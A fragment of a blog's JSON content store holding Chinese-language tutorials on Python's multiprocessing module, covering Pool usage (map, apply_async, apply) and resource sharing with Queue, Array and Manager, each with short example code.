class=\"string\">''</span></div><div class=\"line\">\t    pool.apply(<span class=\"built_in\">test</span>, args=(i,))   <span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">print</span> “<span class=\"built_in\">test</span>”</div><div class=\"line\">\tpool.close()</div><div class=\"line\">\tpool.join()</div></pre></td></tr></table></figure>\n<p>说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程…..等500个子进程都执行完了，再执行print “test”。（从结果来看，并没有多进程并发）</p>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n","excerpt":"","more":"<p>　　Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。</p>\n<h4 id=\"Pool介绍\"><a href=\"#Pool介绍\" class=\"headerlink\" title=\"Pool介绍\"></a>Pool介绍</h4><h5 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h5><p>Pool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用<a href=\"http://thief.one/2016/11/24/Multiprocessing-Process\">Process</a>类。</p>\n<h5 id=\"构造方法\"><a href=\"#构造方法\" class=\"headerlink\" title=\"构造方法\"></a>构造方法</h5><ul>\n<li>Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]])</li>\n<li>processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。</li>\n<li>initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。</li>\n<li>maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。</li>\n<li>context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。</li>\n</ul>\n<h5 id=\"实例方法\"><a href=\"#实例方法\" class=\"headerlink\" title=\"实例方法\"></a>实例方法</h5><ul>\n<li>apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。</li>\n<li>apply(func[, args[, kwds]])是阻塞的。</li>\n<li>close()    关闭pool，使其不在接受新的任务。</li>\n<li>terminate()    关闭pool，结束工作进程，不在处理未完成的任务。</li>\n<li>join()    主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。</li>\n</ul>\n<h4 id=\"Pool使用方法\"><a href=\"#Pool使用方法\" class=\"headerlink\" title=\"Pool使用方法\"></a>Pool使用方法</h4><h5 id=\"Pool-map函数\"><a href=\"#Pool-map函数\" class=\"headerlink\" title=\"Pool+map函数\"></a>Pool+map函数</h5><p>说明：此写法缺点在于只能通过map向函数传递一个参数。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i):</div><div class=\"line\">    <span class=\"built_in\">print</span> i</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tlists=[1,2,3]</div><div class=\"line\">\tpool=Pool(processes=2) <span class=\"comment\">#定义最大的进程数</span></div><div class=\"line\">\tpool.map(<span class=\"built_in\">test</span>,lists)        <span class=\"comment\">#p必须是一个可迭代变量。</span></div><div class=\"line\">\tpool.close()</div><div class=\"line\">\tpool.join()</div></pre></td></tr></table></figure>\n<h5 id=\"异步进程池（非阻塞）\"><a href=\"#异步进程池（非阻塞）\" class=\"headerlink\" title=\"异步进程池（非阻塞）\"></a>异步进程池（非阻塞）</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i):</div><div class=\"line\">    <span class=\"built_in\">print</span> i</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tpool = Pool(processes=10)</div><div class=\"line\">\t<span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(500):</div><div class=\"line\">\t\t<span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">\t\tFor循环中执行步骤：</div><div class=\"line\">\t\t（1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞）</div><div class=\"line\">\t\t（2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞）</div><div class=\"line\">\t\t</div><div class=\"line\">\t\tapply_async为异步进程池写法。</div><div class=\"line\">\t\t异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。</div><div class=\"line\">\t\t'</span><span class=\"string\">''</span></div><div class=\"line\">\t    pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)) <span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.       </span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">print</span> “<span class=\"built_in\">test</span>”</div><div class=\"line\">\tpool.close()</div><div class=\"line\">\tpool.join()</div></pre></td></tr></table></figure>\n<p>执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句）</p>\n<p>注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。</p>\n<h5 id=\"同步进程池（阻塞）\"><a href=\"#同步进程池（阻塞）\" class=\"headerlink\" title=\"同步进程池（阻塞）\"></a>同步进程池（阻塞）</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):</div><div class=\"line\">       <span class=\"built_in\">print</span> p</div><div class=\"line\">       time.sleep(3)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tpool = Pool(processes=10)</div><div class=\"line\">\t<span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(500):</div><div class=\"line\">\t<span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">\t实际测试发现，for循环内部执行步骤：</div><div class=\"line\">\t（1）遍历500个可迭代对象，往进程池放一个子进程</div><div class=\"line\">\t（2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程）</div><div class=\"line\">\tfor循环执行完毕，再执行print函数。</div><div class=\"line\">\t'</span><span class=\"string\">''</span></div><div class=\"line\">\t    pool.apply(<span class=\"built_in\">test</span>, args=(i,))   <span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">print</span> “<span class=\"built_in\">test</span>”</div><div class=\"line\">\tpool.close()</div><div class=\"line\">\tpool.join()</div></pre></td></tr></table></figure>\n<p>说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程…..等500个子进程都执行完了，再执行print “test”。（从结果来看，并没有多进程并发）</p>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n"},{"title":"Multiprocessing共享资源","date":"2016-11-24T02:53:41.000Z","comments":1,"_content":"　　在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。\n\n### Queue类\n\n使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）\n\n```bash\nfrom multiprocessing import Process, Queue  \n\ndef test(queue):  \n    queue.put(\"Hello World\")  \n\nif __name__ == '__main__':\n    q = Queue()  \n    p = Process(target=test, args=(q,))  #需要将q对象传递给子进程\n    p.start()\n\n    print q.get()  \n```\n缺点：不能再Pool进程池中使用。\n\n### Array、Value类\n\n使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）\n\n```bash\nfrom multiprocessing import Process, Array\n\ndef test(a):\n    for i in range(len(a)):\n        a[i] = -a[i]\n\nif __name__ == '__main__':\n    arr = Array('i', range(10))\n    p = Process(target=test, args=(arr))  #需要将arr对象传递给子进程\n    p.start()\n    p.join()\n    print arr[:]\n\n```\n缺点：无法与Pool一起使用。\n\n### Manager类\n\n使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）\n\n说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。\n\n实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。\n\n#### linux版本\n```bash\nfrom multiprocessing import Manager,Pool\n\nlists=Manager().list()    ##定义可被子进程共享的全局变量lists\n\ndef test(i):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    for i in xrange(10000000):\n    \t'''\n    \t判断如果lists长度大于0，则不再往进程池中添加进程。\n    \t'''\n        if len(lists)<=0:\n            pool.apply_async(test,args=(i,))\n        else:\n            break\n     pool.close()\n     pool.join()\n```\n优点：可以跟Pool一起用，且速度比较快。\n\n\n#### windows版本\n\n```bash\nfrom multiprocessing import Manager\n\ndef test(i,lists):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    lists=Manager().list() #Manager类实例化代码只能写在main()函数里面\n    for i in xrange(10000000):\n        if len(lists)<=0:\n        \t'''\n        \t在创建子进程时，需要将lists对象传入，不然无法共享。\n        \t'''\n            pool.apply_async(test,args=(i,lists))##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。\n        else:\n            break\n```\n说明：与linux版本代码相比，windows下代码将lists的引用放在了main()之后，因为windows下只能在main函数下引用多进程。而在实例化子进程时，必须把Manager对象传递给子进程，否则lists无法被共享，而这个过程会消耗巨大资源，因此性能很差。\n缺点：速度很慢，因此在windows下想要提前结束所有进程，可以使用获取返回值的方式，参考[Multiprocessing子进程返回值](http://thief.one/2016/11/24/Multiprocessing子进程返回值)\n\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","source":"_posts/Multiprocessing共享资源.md","raw":"---\ntitle: Multiprocessing共享资源\ndate: 2016-11-24 10:53:41\ncomments: true\ntags: Multiprocessing\ncategories: 编程之道\n---\n　　在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。\n\n### Queue类\n\n使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）\n\n```bash\nfrom multiprocessing import Process, Queue  \n\ndef test(queue):  \n    queue.put(\"Hello World\")  \n\nif __name__ == '__main__':\n    q = Queue()  \n    p = Process(target=test, args=(q,))  #需要将q对象传递给子进程\n    p.start()\n\n    print q.get()  \n```\n缺点：不能再Pool进程池中使用。\n\n### Array、Value类\n\n使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）\n\n```bash\nfrom multiprocessing import Process, Array\n\ndef test(a):\n    for i in range(len(a)):\n        a[i] = -a[i]\n\nif __name__ == '__main__':\n    arr = Array('i', range(10))\n    p = Process(target=test, args=(arr))  #需要将arr对象传递给子进程\n    p.start()\n    p.join()\n    print arr[:]\n\n```\n缺点：无法与Pool一起使用。\n\n### Manager类\n\n使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）\n\n说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。\n\n实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。\n\n#### linux版本\n```bash\nfrom multiprocessing import Manager,Pool\n\nlists=Manager().list()    ##定义可被子进程共享的全局变量lists\n\ndef test(i):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    for i in xrange(10000000):\n    \t'''\n    \t判断如果lists长度大于0，则不再往进程池中添加进程。\n    \t'''\n        if len(lists)<=0:\n            pool.apply_async(test,args=(i,))\n        else:\n            break\n     pool.close()\n     pool.join()\n```\n优点：可以跟Pool一起用，且速度比较快。\n\n\n#### windows版本\n\n```bash\nfrom multiprocessing import Manager\n\ndef test(i,lists):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    lists=Manager().list() #Manager类实例化代码只能写在main()函数里面\n    for i in xrange(10000000):\n        if len(lists)<=0:\n        \t'''\n        \t在创建子进程时，需要将lists对象传入，不然无法共享。\n        \t'''\n            pool.apply_async(test,args=(i,lists))##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。\n        else:\n            break\n```\n说明：与linux版本代码相比，windows下代码将lists的引用放在了main()之后，因为windows下只能在main函数下引用多进程。而在实例化子进程时，必须把Manager对象传递给子进程，否则lists无法被共享，而这个过程会消耗巨大资源，因此性能很差。\n缺点：速度很慢，因此在windows下想要提前结束所有进程，可以使用获取返回值的方式，参考[Multiprocessing子进程返回值](http://thief.one/2016/11/24/Multiprocessing子进程返回值)\n\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","slug":"Multiprocessing共享资源","published":1,"updated":"2017-02-14T01:12:03.336Z","layout":"post","photos":[],"link":"","_id":"ciz80dyam00073ofv4tq1s38i","content":"<p>　　在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。</p>\n<h3 id=\"Queue类\"><a href=\"#Queue类\" class=\"headerlink\" title=\"Queue类\"></a>Queue类</h3><p>使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process, Queue  </div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(queue):  </div><div class=\"line\">    queue.put(<span class=\"string\">\"Hello World\"</span>)  </div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    q = Queue()  </div><div class=\"line\">    p = Process(target=<span class=\"built_in\">test</span>, args=(q,))  <span class=\"comment\">#需要将q对象传递给子进程</span></div><div class=\"line\">    p.start()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">print</span> q.get()</div></pre></td></tr></table></figure>\n<p>缺点：不能再Pool进程池中使用。</p>\n<h3 id=\"Array、Value类\"><a href=\"#Array、Value类\" class=\"headerlink\" title=\"Array、Value类\"></a>Array、Value类</h3><p>使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process, Array</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(a):</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(a)):</div><div class=\"line\">        a[i] = <span class=\"_\">-a</span>[i]</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    arr = Array(<span class=\"string\">'i'</span>, range(10))</div><div class=\"line\">    p = Process(target=<span class=\"built_in\">test</span>, args=(arr))  <span class=\"comment\">#需要将arr对象传递给子进程</span></div><div class=\"line\">    p.start()</div><div class=\"line\">    p.join()</div><div class=\"line\">    <span class=\"built_in\">print</span> arr[:]</div></pre></td></tr></table></figure>\n<p>缺点：无法与Pool一起使用。</p>\n<h3 id=\"Manager类\"><a href=\"#Manager类\" class=\"headerlink\" title=\"Manager类\"></a>Manager类</h3><p>使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）</p>\n<p>说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。</p>\n<p>实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。</p>\n<h4 id=\"linux版本\"><a href=\"#linux版本\" class=\"headerlink\" title=\"linux版本\"></a>linux版本</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Manager,Pool</div><div class=\"line\"></div><div class=\"line\">lists=Manager().list()    <span class=\"comment\">##定义可被子进程共享的全局变量lists</span></div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i):</div><div class=\"line\">     <span class=\"built_in\">print</span> i</div><div class=\"line\">     lists.append(i)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool=Pool()</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(10000000):</div><div class=\"line\">    \t<span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">    \t判断如果lists长度大于0，则不再往进程池中添加进程。</div><div class=\"line\">    \t'<span class=\"string\">''</span></div><div class=\"line\">        <span class=\"keyword\">if</span> len(lists)&lt;=0:</div><div class=\"line\">            pool.apply_async(<span class=\"built_in\">test</span>,args=(i,))</div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"built_in\">break</span></div><div class=\"line\">     pool.close()</div><div class=\"line\">     pool.join()</div></pre></td></tr></table></figure>\n<p>优点：可以跟Pool一起用，且速度比较快。</p>\n<h4 id=\"windows版本\"><a href=\"#windows版本\" class=\"headerlink\" title=\"windows版本\"></a>windows版本</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Manager</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i,lists):</div><div class=\"line\">     <span class=\"built_in\">print</span> i</div><div class=\"line\">     lists.append(i)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool=Pool()</div><div class=\"line\">    lists=Manager().list() <span class=\"comment\">#Manager类实例化代码只能写在main()函数里面</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(10000000):</div><div class=\"line\">        <span class=\"keyword\">if</span> len(lists)&lt;=0:</div><div class=\"line\">        \t<span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">        \t在创建子进程时，需要将lists对象传入，不然无法共享。</div><div class=\"line\">        \t'<span class=\"string\">''</span></div><div class=\"line\">            pool.apply_async(<span class=\"built_in\">test</span>,args=(i,lists))<span class=\"comment\">##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。</span></div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"built_in\">break</span></div></pre></td></tr></table></figure>\n<p>说明：与linux版本代码相比，windows下代码将lists的引用放在了main()之后，因为windows下只能在main函数下引用多进程。而在实例化子进程时，必须把Manager对象传递给子进程，否则lists无法被共享，而这个过程会消耗巨大资源，因此性能很差。<br>缺点：速度很慢，因此在windows下想要提前结束所有进程，可以使用获取返回值的方式，参考<a href=\"http://thief.one/2016/11/24/Multiprocessing子进程返回值\">Multiprocessing子进程返回值</a></p>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n","excerpt":"","more":"<p>　　在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。</p>\n<h3 id=\"Queue类\"><a href=\"#Queue类\" class=\"headerlink\" title=\"Queue类\"></a>Queue类</h3><p>使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process, Queue  </div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(queue):  </div><div class=\"line\">    queue.put(<span class=\"string\">\"Hello World\"</span>)  </div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    q = Queue()  </div><div class=\"line\">    p = Process(target=<span class=\"built_in\">test</span>, args=(q,))  <span class=\"comment\">#需要将q对象传递给子进程</span></div><div class=\"line\">    p.start()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">print</span> q.get()</div></pre></td></tr></table></figure>\n<p>缺点：不能再Pool进程池中使用。</p>\n<h3 id=\"Array、Value类\"><a href=\"#Array、Value类\" class=\"headerlink\" title=\"Array、Value类\"></a>Array、Value类</h3><p>使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process, Array</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(a):</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(a)):</div><div class=\"line\">        a[i] = <span class=\"_\">-a</span>[i]</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    arr = Array(<span class=\"string\">'i'</span>, range(10))</div><div class=\"line\">    p = Process(target=<span class=\"built_in\">test</span>, args=(arr))  <span class=\"comment\">#需要将arr对象传递给子进程</span></div><div class=\"line\">    p.start()</div><div class=\"line\">    p.join()</div><div class=\"line\">    <span class=\"built_in\">print</span> arr[:]</div></pre></td></tr></table></figure>\n<p>缺点：无法与Pool一起使用。</p>\n<h3 id=\"Manager类\"><a href=\"#Manager类\" class=\"headerlink\" title=\"Manager类\"></a>Manager类</h3><p>使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）</p>\n<p>说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。</p>\n<p>实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。</p>\n<h4 id=\"linux版本\"><a href=\"#linux版本\" class=\"headerlink\" title=\"linux版本\"></a>linux版本</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Manager,Pool</div><div class=\"line\"></div><div class=\"line\">lists=Manager().list()    <span class=\"comment\">##定义可被子进程共享的全局变量lists</span></div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i):</div><div class=\"line\">     <span class=\"built_in\">print</span> i</div><div class=\"line\">     lists.append(i)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool=Pool()</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(10000000):</div><div class=\"line\">    \t<span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">    \t判断如果lists长度大于0，则不再往进程池中添加进程。</div><div class=\"line\">    \t'</span><span class=\"string\">''</span></div><div class=\"line\">        <span class=\"keyword\">if</span> len(lists)&lt;=0:</div><div class=\"line\">            pool.apply_async(<span class=\"built_in\">test</span>,args=(i,))</div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"built_in\">break</span></div><div class=\"line\">     pool.close()</div><div class=\"line\">     pool.join()</div></pre></td></tr></table></figure>\n<p>优点：可以跟Pool一起用，且速度比较快。</p>\n<h4 id=\"windows版本\"><a href=\"#windows版本\" class=\"headerlink\" title=\"windows版本\"></a>windows版本</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Manager</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i,lists):</div><div class=\"line\">     <span class=\"built_in\">print</span> i</div><div class=\"line\">     lists.append(i)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool=Pool()</div><div class=\"line\">    lists=Manager().list() <span 